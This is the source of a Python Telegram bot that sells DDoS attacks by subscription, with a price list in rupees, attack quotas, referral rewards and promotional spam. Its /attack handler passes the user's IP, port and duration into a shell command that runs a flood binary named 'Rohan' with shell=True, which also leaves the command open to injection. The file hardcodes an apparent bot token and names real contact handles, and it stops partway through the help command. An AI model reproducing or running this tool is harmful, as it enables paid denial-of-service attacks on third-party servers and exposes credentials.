#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading
import requests
import hashlib
import sys
import logging

# Setup logging 📝✍️
logging.basicConfig(filename='bot.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here 🔑🔒
bot = telebot.TeleBot('7898888817:AAHfJQUBpUyxj2LS0v6XZ-ufQok262RPJ70')

# Overlord user IDs 👑👑
overlord_id = ["1866961136", "1807014348"]

# Group and channel details 🌐📡
GROUP_IDS = ["-1002328886935", "-1002669651081"]  # @freeddos_group12 and Vip Hacker Ddos
CHANNEL_IDS = ["-1002308316749"]  # @ddos_server69
GROUP_USERNAME = "@freeddos_group12"
CHANNEL_USERNAME = "@ddos_server69"
VIP_HACKER_DDOS_ID = "-1002669651081"  # Vip Hacker Ddos channel ID
SUPPORT_CONTACT = "@Sadiq9869"  # Overlord @Sadiq9869
PURCHASE_CONTACT = "@Rohan2349"  # Overlord @Rohan2349

# Default cooldown and attack limits ⏳⏰
COOLDOWN_TIME = 15
ATTACK_LIMIT = 10  # Default daily attack limit for non-overlords
USER_MAX_DURATION = 180  # Default max attack duration for regular users (public)
USER_OVERLORD_DURATION = 600  # Default max attack duration for overlords
PAID_USER_DURATION = 600  # Max attack duration for paid users
MAX_REFERRAL_BONUS = 5  # Max extra strikes from referrals

# To store paid users (for Thunder Arsenal) 💎💰
PAID_USERS = {}  # user_id -> expiry datetime

global_pending_attack = None
global_last_attack_time = None
pending_feedback = {}
global_attack_running = False
overlord_attack_running = False  # Separate flag for overlord attacks
attack_lock = threading.Lock()
overlord_attack_lock = threading.Lock()  # Separate lock for overlord attacks

# Files to store user data, feedback hashes, referrals, attack history, ranks, and paid users 📂📁
USER_FILE = "users.txt"
FEEDBACK_HASH_FILE = "feedback_hashes.txt"
REFERRAL_FILE = "referrals.txt"
HISTORY_FILE = "attack_history.txt"
RANK_FILE = "ranks.txt"
PAID_USERS_FILE = "paid_users.txt"

# Dictionary to store user states, feedback hashes, referral data, attack history, and ranks 📊📈
user_data = {}
feedback_hashes = set()
referral_data = {}  # To store referral counts
attack_history = {}  # To store attack history (user_id -> list of attacks)
user_ranks = {}  # To store user ranks (user_id -> rank)
global_last_attack_time = None

# Thunder Rank System 🏆🎖️
RANKS = {
    0: "Rookie Operative 🐣👶",
    10: "Cyber Enforcer 🛡️💂",
    25: "Thunder Soldier ⚔️🪖",
    50: "Elite Striker 🌟✨",
    100: "Thunder Lord 👑🔥"
}

# Daily Missions 🎯📋
DAILY_MISSIONS = {
    "attacks": {"task": "Launch 3 Attacks 🚀💥", "count": 3, "reward": 1},
    "invites": {"task": "Invite 1 Friend 📩🤝", "count": 1, "reward": 1}
}

# 🎯 Random Image URLs 🖼️📸
image_urls = [
    "https://envs.sh/g7a.jpg", "https://envs.sh/g7O.jpg", "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg", "https://envs.sh/gH4.jpg", "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg", "https://envs.sh/gH1.jpg", "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg", "https://envs.sh/67E.jpg", "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg", "https://envs.sh/68V.jpg", "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg", "https://envs.sh/Vwe.jpg", "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg", "https://envs.sh/VwK.jpg", "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg", "https://envs.sh/Vwc.jpg"
]

# Custom emoji theme for @freeddos_group12 🌩️⚡
custom_emojis = ["⚡", "🌩️", "🔥", "💥", "🎯", "⏳", "📸", "✅", "❌", "🛑", "💾", "🌐", "🔋"]

# Example feedback images (replace with actual URLs or file IDs) 📷🖼️
EXAMPLE_FEEDBACK_IMAGE_1 = "https://example.com/bgmi_feedback_677ping.jpg"  # First image with 677 ping
EXAMPLE_FEEDBACK_IMAGE_2 = "https://example.com/bgmi_feedback_lobby.jpg"   # Second image (lobby)

# Branded footer for all messages 🖌️🎨
def branded_footer():
    return f"\n\n⚡ **Powered by {GROUP_USERNAME}** ⚡💪\n🌩️ **Command Hub:** {CHANNEL_USERNAME} 📡🔗"

# Price list in INR (Updated with new offer, emojis, and Overlord references) 💰💸
PRICE_LIST = (
    "🌩️ **THUNDER ARSENAL - UNLEASH YOUR POWER!** 🌩️💎\n"
    "⚡ **Free Users Stuck at {USER_MAX_DURATION}s? Get 600s + Unlimited Attacks Now!** ⚡⏰\n\n"
    "💰 **POWER-UP PLANS** 💰🔥\n"
    "✨ **1 DAY STRIKE CORE**: ₹150 💵 - *First Strike Free!* 🎁\n"
    "✨ **3 DAY STORM MODULE**: ₹350 💵 - *+1 Day Free!* 🆓\n"
    "✨ **7 DAY THUNDER CORE**: ₹799 💵 - *+3 Days Free for First 50 Buyers!* 🎉\n"
    "✨ **15 DAY LIGHTNING GRID**: ₹1599 💵 - *+5 Days Free + VIP Badge!* 🏆\n"
    "✨ **30 DAY STORM KING**: ₹4000 💵 - *+7 Days Free!* 💖\n"
    "✨ **60 DAY EMPEROR’S WRATH**: ₹7999 💵 - *+12 Days Free!* 💝\n\n"
    "🔥 **LIMITED TIME OFFER**: 1H DDOS for ₹20! 🔥⏳\n"
    "💥 **Super Effective - Dominate Instantly!** 💥\n\n"
    "💎 **Why Go Thunder Arsenal?** 💎\n"
    "✅ **Unlimited Attacks** - No Limits! 🚀\n"
    "✅ **No Cooldowns** - Strike Anytime! ⏳❌\n"
    "✅ **No Feedback Hassle** - Pure Power! 📸❌\n"
    "✅ **600s Duration** - Crush Free Users’ {USER_MAX_DURATION}s! ⏰\n"
    "✅ **Priority Support** from {SUPPORT_CONTACT}! 🛠️\n\n"
    "👑 **Ready to Rule? Buy Now from Overlord {PURCHASE_CONTACT}!** 👑📩\n"
    f"{branded_footer()}"
)

def is_user_in_group(user_id):
    try:
        member = bot.get_chat_member(GROUP_IDS[0], user_id)  # Check only @freeddos_group12
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_IDS[0], user_id)  # Check only @ddos_server69
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def is_paid_user(user_id):
    """Check if user is a paid Thunder Arsenal user and their subscription is active. 💎💰"""
    if user_id in PAID_USERS:
        expiry = PAID_USERS[user_id]
        if datetime.datetime.now() < expiry:
            return True
        else:
            del PAID_USERS[user_id]  # Remove expired subscription
            save_paid_users()
    return False

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None,
                    'referral_bonus': 0,
                    'mission_attacks': 0,
                    'mission_invites': 0,
                    'mission_reset': datetime.datetime.now()
                }
    except FileNotFoundError:
        pass

def load_feedback_hashes():
    try:
        with open(FEEDBACK_HASH_FILE, "r") as file:
            for line in file:
                feedback_hashes.add(line.strip())
    except FileNotFoundError:
        pass

def load_referrals():
    try:
        with open(REFERRAL_FILE, "r") as file:
            for line in file:
                user_id, count = line.strip().split(',')
                referral_data[user_id] = int(count)
    except FileNotFoundError:
        pass

def load_attack_history():
    try:
        with open(HISTORY_FILE, "r") as file:
            for line in file:
                user_id, target, port, duration, status, timestamp = line.strip().split(',')
                if user_id not in attack_history:
                    attack_history[user_id] = []
                attack_history[user_id].append({
                    'target': target,
                    'port': port,
                    'duration': int(duration),
                    'status': status,
                    'timestamp': datetime.datetime.fromisoformat(timestamp)
                })
    except FileNotFoundError:
        pass

def load_ranks():
    try:
        with open(RANK_FILE, "r") as file:
            for line in file:
                user_id, points = line.strip().split(',')
                user_ranks[user_id] = int(points)
    except FileNotFoundError:
        pass

def load_paid_users():
    try:
        with open(PAID_USERS_FILE, "r") as file:
            for line in file:
                user_id, expiry = line.strip().split(',')
                PAID_USERS[user_id] = datetime.datetime.fromisoformat(expiry)
    except FileNotFoundError:
        pass

def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

def save_feedback_hash(image_hash):
    with open(FEEDBACK_HASH_FILE, "a") as file:
        file.write(f"{image_hash}\n")
    feedback_hashes.add(image_hash)

def save_referrals():
    with open(REFERRAL_FILE, "w") as file:
        for user_id, count in referral_data.items():
            file.write(f"{user_id},{count}\n")

def save_attack_history():
    with open(HISTORY_FILE, "w") as file:
        for user_id, history in attack_history.items():
            for entry in history:
                file.write(f"{user_id},{entry['target']},{entry['port']},{entry['duration']},"
                           f"{entry['status']},{entry['timestamp'].isoformat()}\n")

def save_ranks():
    with open(RANK_FILE, "w") as file:
        for user_id, points in user_ranks.items():
            file.write(f"{user_id},{points}\n")

def save_paid_users():
    with open(PAID_USERS_FILE, "w") as file:
        for user_id, expiry in PAID_USERS.items():
            file.write(f"{user_id},{expiry.isoformat()}\n")

def get_user_rank(user_id):
    points = user_ranks.get(user_id, 0)
    rank = "Rookie Operative 🐣👶"
    for threshold, rank_name in sorted(RANKS.items(), reverse=True):
        if points >= threshold:
            rank = rank_name
            break
    return rank, points

def update_user_rank(user_id, points_to_add):
    user_ranks[user_id] = user_ranks.get(user_id, 0) + points_to_add
    save_ranks()
    rank, points = get_user_rank(user_id)
    if points_to_add > 0:
        bot.send_message(user_id, 
                         f"🎖️ **Rank Update!** 🎖️🏆\n"
                         f"⚡ **New Rank:** {rank} 🌟✨\n"
                         f"💾 **Thunder Points:** {points} 📊📈\n"
                         f"🌩️ **Keep Striking to Rise!** 🌩️🚀💪"
                         f"{branded_footer()} 😍🎉")

def hash_image(file_id):
    try:
        file_info = bot.get_file(file_id)
        file_url = f"https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}"
        response = requests.get(file_url)
        image_data = response.content
        return hashlib.sha256(image_data).hexdigest()
    except Exception as e:
        logging.error(f"Error hashing image: {e}")
        return None

def set_message_reaction(chat_id, message_id, emoji):
    url = f"https://api.telegram.org/bot{bot.token}/setMessageReaction"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "reaction": [{"type": "emoji", "emoji": emoji}],
        "is_big": True
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            logging.error(f"Failed to set reaction: {response.text}")
    except Exception as e:
        logging.error(f"Error setting reaction: {e}")

# Simulate attack progress with updates 🚀💥
def simulate_attack(chat_id, target, port, time_duration, remaining_attacks, user_name, is_overlord=False, is_paid=False):
    global global_attack_running, overlord_attack_running
    interval = time_duration / 10  # Update every 10% of the duration
    for progress in range(0, 101, 10):
        time.sleep(interval)
        remaining_time = int(time_duration - (progress / 100 * time_duration))
        bot.send_message(chat_id, 
                         f"🌩️ **Thunder Strike Update!** 🌩️⚡\n"
                         f"🎯 **Target Locked:** `{target}:{port}` 🔒🔍\n"
                         f"⏳ **Time Remaining:** {remaining_time}s ⏰⏱️\n"
                         f"⚡ **Operation Progress:** {progress}% 📈📊"
                         f"{branded_footer()} 😎💥")
    bot.send_message(chat_id, 
                     f"✅ **Target Annihilated!** ✅🎉\n"
                     f"🎯 `{target}:{port}` **Reduced to Ashes!** 🔥💥💣\n"
                     f"⏳ **Strike Duration:** {time_duration}s ⏰⏱️\n"
                     f"⚡ **Remaining Strikes:** {remaining_attacks} 💣💥\n"
                     f"⏳ **Operation Progress:** 100% 🏁🎯"
                     f"{branded_footer()} 😍✨")
    if is_overlord:
        with overlord_attack_lock:
            overlord_attack_running = False
    elif is_paid:
        pass  # Paid users can run multiple attacks, no lock needed
    else:
        with attack_lock:
            global_attack_running = False

# Automatic promotion every 5 minutes 📢📣
def auto_promotion():
    while True:
        for group_id in GROUP_IDS:
            try:
                bot.send_message(group_id, 
                    "🌩️ **Thunder Command Calls You!** 🌩️⚡\n"
                    "💥 **Free Users Limited to {USER_MAX_DURATION}s & {ATTACK_LIMIT} Attacks/Day!** 💥⏳\n"
                    "💎 **Upgrade to Thunder Arsenal: 600s Attacks, Unlimited Power, No Limits!** 💎🚀\n"
                    f"📜 **Plans Start at ₹150!** Check Full Power: /start 📋\n"
                    f"👑 **Buy Now from Overlord {PURCHASE_CONTACT}!** 👑📩\n"
                    f"⚡ **Join {GROUP_USERNAME} & {CHANNEL_USERNAME} to Strike!** ⚡🤝"
                    f"{branded_footer()} 😍🎉",
                    parse_mode="Markdown")
            except Exception as e:
                logging.error(f"Error in auto-promotion: {e}")
        time.sleep(300)  # 5 minutes

# Start auto-promotion in a separate thread 🧵🪡
promotion_thread = threading.Thread(target=auto_promotion, daemon=True)
promotion_thread.start()

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name

    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }

    # Check if user came via referral 📩🤝
    command = message.text.split()
    if len(command) > 1:
        referrer_id = command[1]
        if referrer_id in referral_data and referrer_id != user_id:
            referral_data[referrer_id] = referral_data.get(referrer_id, 0) + 1
            user_data[referrer_id]['mission_invites'] += 1
            if user_data[referrer_id].get('referral_bonus', 0) < MAX_REFERRAL_BONUS:
                user_data[referrer_id]['referral_bonus'] = user_data[referrer_id].get('referral_bonus', 0) + 1
                bot.send_message(referrer_id, 
                                 f"🎉 **New Operative Recruited!** 🎉🎊\n"
                                 f"⚡ **You Earned 1 Extra Strike!** ⚡💥🔥\n"
                                 f"💥 **Total Extra Strikes:** {user_data[referrer_id]['referral_bonus']} 🎁✨"
                                 f"{branded_footer()} 😍🤗")
            update_user_rank(referrer_id, 2)  # 2 points for a referral
            save_referrals()
            save_users()

    response = (f"🌩️ **Welcome to Thunder Command, {user_name}!** 🌩️😍✨\n"
                f"⚡ **Join {GROUP_USERNAME} - The Ultimate Cyber Strike Force!** ⚡🌟\n"
                f"💥 **Free Users Get {USER_MAX_DURATION}s Attacks & {ATTACK_LIMIT}/Day!** 💥⏳\n"
                f"💎 **Unlock 600s + Unlimited Attacks with Thunder Arsenal!** 💎🚀\n\n"
                f"📜 **Your Mission:** 📋\n"
                f"1️⃣ Join {GROUP_USERNAME} & {CHANNEL_USERNAME} 🤝\n"
                f"2️⃣ Strike: /attack <IP> <PORT> <TIME> 💣\n"
                f"3️⃣ Upgrade for Power: Check Plans Below! 💰\n\n"
                f"{PRICE_LIST}")
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    is_overlord = user_id in overlord_id
    is_paid = is_paid_user(user_id)

    # Check if user is in group and channel (skip for overlords and paid users) 🔍👀
    if not is_overlord and not is_paid and not is_user_in_group(user_id):
        bot.reply_to(message, f"🌪️ **Join {GROUP_USERNAME} First!** 🌪️❗\n"
                              f"⚡ **Free Users Need to Join to Strike!** ⚡🤝"
                              f"{branded_footer()} 😓😢")
        return
    if not is_overlord and not is_paid and not is_user_in_channel(user_id):
        bot.reply_to(message, f"🔥 **Join {CHANNEL_USERNAME} First!** 🔥❗\n"
                              f"⚡ **Sync Up to Unleash Power!** ⚡📡"
                              f"{branded_footer()} 😓😢")
        return

    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }

    user = user_data[user_id]
    total_attacks = user['attacks'] - user.get('referral_bonus', 0)
    remaining_attacks = "Unlimited" if (is_overlord or is_paid) else (ATTACK_LIMIT + user.get('referral_bonus', 0) - total_attacks)
    referral_count = referral_data.get(user_id, 0)
    rank, points = get_user_rank(user_id)
    status = "Overlord 👑👑" if is_overlord else ("Thunder Arsenal Operative 💎✨" if is_paid else "Free Operative 🐣👶")

    bot.reply_to(message, 
                 f"👤 **Profile: {user_name}** 👤🌟\n"
                 f"🆔 **ID:** `{user_id}` 🖥️\n"
                 f"⚡ **Status:** {status} 🌟\n"
                 f"🎖️ **Rank:** {rank} 🏆\n"
                 f"💾 **Points:** {points} 📊\n"
                 f"💥 **Strikes Used:** {total_attacks} 💣\n"
                 f"🎁 **Bonus Strikes:** {user.get('referral_bonus', 0)} 🎉\n"
                 f"⚡ **Remaining Strikes:** {remaining_attacks} 🚀\n"
                 f"📩 **Invites:** {referral_count} 🤝\n"
                 f"⏳ **Last Reset:** {user['last_reset'].strftime('%Y-%m-%d %H:%M:%S')} ⏰\n"
                 f"💎 **Want Unlimited Power? /start for Plans!** 💎"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['missions'])
def daily_missions(message):
    user_id = str(message.from_user.id)
    is_overlord = user_id in overlord_id
    is_paid = is_paid_user(user_id)

    # Check if user is in group and channel (skip for overlords and paid users) 🔍👀
    if not is_overlord and not is_paid and not is_user_in_group(user_id):
        bot.reply_to(message, f"🌪️ **Join {GROUP_USERNAME} First!** 🌪️❗\n"
                              f"⚡ **Free Users Need to Join!** ⚡🤝"
                              f"{branded_footer()} 😓😢")
        return
    if not is_overlord and not is_paid and not is_user_in_channel(user_id):
        bot.reply_to(message, f"🔥 **Join {CHANNEL_USERNAME} First!** 🔥❗\n"
                              f"⚡ **Sync Up to Strike!** ⚡📡"
                              f"{branded_footer()} 😓😢")
        return

    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }

    user = user_data[user_id]
    now = datetime.datetime.now()
    if (now - user['mission_reset']).days >= 1:
        user['mission_attacks'] = 0
        user['mission_invites'] = 0
        user['mission_reset'] = now
        save_users()

    mission_status = (
        f"📜 **Daily Missions** 📜\n\n"
        f"🎯 **{DAILY_MISSIONS['attacks']['task']}**\n"
        f"⚡ **Progress:** {user['mission_attacks']}/{DAILY_MISSIONS['attacks']['count']} 📈\n"
        f"🎁 **Reward:** {DAILY_MISSIONS['attacks']['reward']} Strike 🎉\n\n"
        f"📩 **{DAILY_MISSIONS['invites']['task']}**\n"
        f"⚡ **Progress:** {user['mission_invites']}/{DAILY_MISSIONS['invites']['count']} 📈\n"
        f"🎁 **Reward:** {DAILY_MISSIONS['invites']['reward']} Strike 🎉\n\n"
        f"⏳ **Reset:** {user['mission_reset'].replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)} ⏰\n"
        f"💎 **Skip Limits with Thunder Arsenal! /start** 💎"
        f"{branded_footer()} 😍🤗"
    )
    bot.reply_to(message, mission_status)

@bot.message_handler(commands=['history'])
def attack_history_command(message):
    user_id = str(message.from_user.id)
    is_overlord = user_id in overlord_id
    is_paid = is_paid_user(user_id)

    # Check if user is in group and channel (skip for overlords and paid users) 🔍👀
    if not is_overlord and not is_paid and not is_user_in_group(user_id):
        bot.reply_to(message, f"🌪️ **Join {GROUP_USERNAME} First!** 🌪️❗\n"
                              f"⚡ **Free Users Need to Join!** ⚡🤝"
                              f"{branded_footer()} 😓😢")
        return
    if not is_overlord and not is_paid and not is_user_in_channel(user_id):
        bot.reply_to(message, f"🔥 **Join {CHANNEL_USERNAME} First!** 🔥❗\n"
                              f"⚡ **Sync Up to Strike!** ⚡📡"
                              f"{branded_footer()} 😓😢")
        return

    if user_id not in attack_history or not attack_history[user_id]:
        bot.reply_to(message, "📜 **No Strikes Yet!** 📜\n"
                              "⚡ **Launch Your First Attack Now!** ⚡💣"
                              f"{branded_footer()} 😓😢")
        return

    history = attack_history[user_id][-5:]  # Show last 5 attacks
    history_text = "\n".join([f"🎯 **{entry['target']}:{entry['port']}** | **{entry['duration']}s** | "
                              f"**{entry['status']}** | **{entry['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}**" 
                              for entry in history])
    bot.reply_to(message, 
                 f"📜 **Last 5 Strikes** 📜\n\n"
                 f"{history_text}\n\n"
                 f"💎 **Get 600s Attacks with Thunder Arsenal! /start** 💎"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_attack_running, overlord_attack_running
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()
    is_overlord = user_id in overlord_id
    is_paid = is_paid_user(user_id)

    # Overlords and paid users can use bot anywhere; non-overlords must be in allowed groups 🔍👀
    if not is_overlord and not is_paid and str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, "🌪️ **Only Works in {GROUP_USERNAME}!** 🌪️❗\n"
                              f"⚡ **Join to Strike!** ⚡🤝"
                              f"{branded_footer()} 😓😢")
        return

    # Check if user is in group and channel (skip for overlords and paid users) 🔍👀
    if not is_overlord and not is_paid and not is_user_in_group(user_id):
        bot.reply_to(message, f"🌪️ **Join {GROUP_USERNAME} First!** 🌪️❗\n"
                              f"⚡ **Free Users Need to Join!** ⚡🤝"
                              f"{branded_footer()} 😓😢")
        return
    if not is_overlord and not is_paid and not is_user_in_channel(user_id):
        bot.reply_to(message, f"🔥 **Join {CHANNEL_USERNAME} First!** 🔥❗\n"
                              f"⚡ **Sync Up to Strike!** ⚡📡"
                              f"{branded_footer()} 😓😢")
        return

    # Feedback requirement only for non-overlords and non-paid users 📸🖼️
    if not is_overlord and not is_paid and pending_feedback.get(user_id, False):
        bot.reply_to(message, "💥 **Submit BGMI Screenshot First!** 💥❗\n"
                              "📸 **Required for Free Users!** 📸\n"
                              f"🛠️ **Help: {SUPPORT_CONTACT}** 📞"
                              f"{branded_footer()} 😓😢")
        return

    if len(command) != 4:
        bot.reply_to(message, "❌ **Wrong Format!** ❌\n"
                              "📜 **Usage:** /attack <IP> <PORT> <TIME>\n"
                              "📌 **Examples:**\n"
                              "1️⃣ /attack 192.168.1.1 80 180\n"
                              "2️⃣ /attack 10.0.0.1 443 120\n"
                              f"{branded_footer()} 😓😢")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        time_duration = int(time_duration)
        port = int(port)
    except ValueError:
        bot.reply_to(message, "❌ **Port & Time Must Be Numbers!** ❌\n"
                              "📜 **Usage:** /attack <IP> <PORT> <TIME>\n"
                              "📌 **Examples:**\n"
                              "1️⃣ /attack 192.168.1.1 80 180\n"
                              "2️⃣ /attack 10.0.0.1 443 120\n"
                              f"{branded_footer()} 😓😢")
        return

    max_duration = USER_OVERLORD_DURATION if is_overlord else (PAID_USER_DURATION if is_paid else USER_MAX_DURATION)
    if time_duration > max_duration:
        bot.reply_to(message, f"⏰ **Max Duration Exceeded!** ⏰\n"
                              f"⚠️ **Limit:** {max_duration}s ({'Overlords' if is_overlord else 'Paid Users' if is_paid else 'Free Users'})\n"
                              f"💎 **Get 600s with Thunder Arsenal! /start** 💎"
                              f"{branded_footer()} 😓😢")
        return

    if user_id not in user_data:
        user_data[user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'referral_bonus': 0,
            'mission_attacks': 0,
            'mission_invites': 0,
            'mission_reset': datetime.datetime.now()
        }

    user = user_data[user_id]
    now = datetime.datetime.now()

    # Reset daily attacks if needed 🔄♻️
    if (now - user['last_reset']).days >= 1:
        user['attacks'] = 0
        user['last_reset'] = now
        save_users()

    total_attacks = user['attacks'] - user.get('referral_bonus', 0)
    remaining_attacks = ATTACK_LIMIT + user.get('referral_bonus', 0) - total_attacks

    if not (is_overlord or is_paid) and remaining_attacks <= 0:
        bot.reply_to(message, "❌ **No Strikes Left!** ❌\n"
                              "⚠️ **Daily Limit ({ATTACK_LIMIT}) Reached!** ⚠️\n"
                              f"💎 **Go Unlimited with Thunder Arsenal! /start** 💎"
                              f"{branded_footer()} 😓😢")
        return

    # Cooldown check for non-overlords and non-paid users ⏳⏰
    if not (is_overlord or is_paid) and user['last_attack']:
        time_since_last_attack = (now - user['last_attack']).total_seconds()
        if time_since_last_attack < COOLDOWN_TIME:
            remaining_cooldown = int(COOLDOWN_TIME - time_since_last_attack)
            bot.reply_to(message, f"⏳ **Cooldown: Wait {remaining_cooldown}s!** ⏳\n"
                                  f"💎 **No Cooldowns with Thunder Arsenal! /start** 💎"
                                  f"{branded_footer()} 😓😢")
            return

    # Check if another attack is running 🔄♻️
    if is_overlord:
        if overlord_attack_running:
            bot.reply_to(message, "⚡ **Overlord Strike Running!** ⚡\n"
                                  "⏳ **Wait for it to Finish!** ⏳"
                                  f"{branded_footer()} 😓😢")
            return
    elif is_paid:
        pass  # Paid users can run multiple attacks
    else:
        if global_attack_running:
            bot.reply_to(message, "⚡ **Strike in Progress!** ⚡\n"
                                  "⏳ **Wait or Upgrade to Thunder Arsenal! /start** ⏳"
                                  f"{branded_footer()} 😓😢")
            return

    # Profile pic check
    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count == 0:
        bot.reply_to(message, "📸 **Add a Profile Pic First!** 📸\n"
                              "⚡ **Required for Free Users!** ⚡"
                              f"{branded_footer()} 😓😢")
        if not (is_overlord or is_paid):
            with attack_lock:
                global_attack_running = False
        return

    # Actual attack execution
    full_command = f"./Rohan {target} {port} {time_duration} 512 1200"
    try:
        subprocess.run(full_command, shell=True, check=True)
        status = "Completed ✅"
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **Attack Failed!** ❌\n"
                              f"⚡ **Error: Contact {SUPPORT_CONTACT}!** ⚡"
                              f"{branded_footer()} 😓😢")
        logging.error(f"Attack failed for user {user_id}: {e}")
        if not (is_overlord or is_paid):
            with attack_lock:
                global_attack_running = False
        return

    user['last_attack'] = now
    user['attacks'] += 1
    user['mission_attacks'] += 1
    save_users()

    # Update attack history 📜📋
    if user_id not in attack_history:
        attack_history[user_id] = []
    attack_history[user_id].append({
        'target': target,
        'port': port,
        'duration': time_duration,
        'status': status,
        'timestamp': now
    })
    save_attack_history()

    # Update rank points 📈📊
    update_user_rank(user_id, 1)  # 1 point per attack

    # Check daily mission completion 🎯📋
    if user['mission_attacks'] >= DAILY_MISSIONS['attacks']['count']:
        user['referral_bonus'] += DAILY_MISSIONS['attacks']['reward']
        user['mission_attacks'] = 0  # Reset mission progress
        bot.send_message(user_id, 
                         f"🎉 **Mission Done!** 🎉\n"
                         f"📜 **{DAILY_MISSIONS['attacks']['task']}** ✅\n"
                         f"🎁 **+{DAILY_MISSIONS['attacks']['reward']} Strike!** ⚡"
                         f"{branded_footer()} 😍🤗")
        save_users()

    # Start the attack simulation 🚀💥
    if is_overlord:
        with overlord_attack_lock:
            overlord_attack_running = True
    elif not is_paid:
        with attack_lock:
            global_attack_running = True

    remaining_attacks = "Unlimited" if (is_overlord or is_paid) else (ATTACK_LIMIT + user.get('referral_bonus', 0) - (user['attacks'] - user.get('referral_bonus', 0)))
    threading.Thread(target=simulate_attack, args=(message.chat.id, target, port, time_duration, remaining_attacks, user_name, is_overlord, is_paid)).start()

    bot.reply_to(message, 
                 f"⚡ **Strike Launched!** ⚡\n"
                 f"🎯 **{target}:{port}** 🔒\n"
                 f"⏳ **{time_duration}s** ⏰\n"
                 f"⚡ **Remaining:** {remaining_attacks} 💣\n"
                 f"🌩️ **Attack Started!** 🌩️"
                 f"{branded_footer()} 😎🤩")

    # Request feedback from non-overlords and non-paid users 📸🖼️
    if not (is_overlord or is_paid):
        pending_feedback[user_id] = True
        bot.send_message(user_id, 
                         f"📸 **Send BGMI Screenshot!** 📸\n"
                         f"💥 **Required for Next Free Strike!** 💥\n"
                         f"💎 **Skip This with Thunder Arsenal! /start** 💎"
                         f"{branded_footer()} 😍🤗")

@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = str(message.from_user.id)
    is_overlord = user_id in overlord_id
    is_paid = is_paid_user(user_id)

    if not pending_feedback.get(user_id, False):
        bot.reply_to(message, "❌ **No Feedback Needed Yet!** ❌\n"
                              "⚡ **Launch an Attack First!** ⚡💣"
                              f"{branded_footer()} 😓😢")
        return

    if is_overlord or is_paid:
        bot.reply_to(message, "❌ **No Feedback Required!** ❌\n"
                              "⚡ **Paid Users Skip This!** ⚡💎"
                              f"{branded_footer()} 😍🤗")
        return

    image_hash = hash_image(message.photo[-1].file_id)
    if not image_hash:
        bot.reply_to(message, "❌ **Image Error!** ❌\n"
                              "⚠️ **Try Again!** ⚠️📸\n"
                              f"🛠️ **Help: {SUPPORT_CONTACT}** 📞"
                              f"{branded_footer()} 😓😢")
        return

    if image_hash in feedback_hashes:
        bot.reply_to(message, "❌ **Duplicate Screenshot!** ❌\n"
                              "⚠️ **Send a New One!** ⚠️📸\n"
                              f"🛠️ **Help: {SUPPORT_CONTACT}** 📞"
                              f"{branded_footer()} 😓😢")
        return

    save_feedback_hash(image_hash)
    pending_feedback[user_id] = False
    bot.reply_to(message, 
                 "✅ **Feedback Accepted!** ✅\n"
                 "⚡ **Strike Again with /attack!** ⚡"
                 f"{branded_footer()} 😍🤗")
    set_message_reaction(message.chat.id, message.message_id, "✅")

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    is_overlord = user_id in overlord_id

    user_commands = (
        "📜 **User Commands** 📜\n\n"
        "⚡ **/start** - Begin Your Journey! 🚀\n"
        "⚡ **/myinfo** - Check Your Stats! 👤\n"
        "⚡ **/missions** - Daily Tasks! 🎯\n"
        "⚡ **/history** - Last 5 Strikes! 📜\n"
        "⚡ **/attack <IP> <PORT> <TIME>** - Strike Now! 💥\n"
        "⚡ **/invite** - Get Invite Link! 📩\n"
        "⚡ **/leaderboard** - Top Recruiters! 🏆\n"
